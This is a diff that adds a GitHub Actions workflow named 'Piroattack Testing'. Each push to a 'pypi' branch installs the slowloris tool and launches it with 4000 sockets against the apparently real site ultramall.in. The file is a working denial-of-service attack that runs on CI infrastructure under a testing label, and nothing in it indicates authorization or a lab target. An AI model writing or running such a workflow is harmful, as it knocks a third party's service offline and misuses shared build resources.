@@ -1,0 +1,27 @@
+name: Piroattack Testing
+
+on:
+  push:
+    branches:
+      - pypi
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.8
+
+    - name: Install dependencies
+      run: |
+        pip install slowloris
+
+    - name: Run piroattack
+      run: |
+        slowloris ultramall.in -s 4000
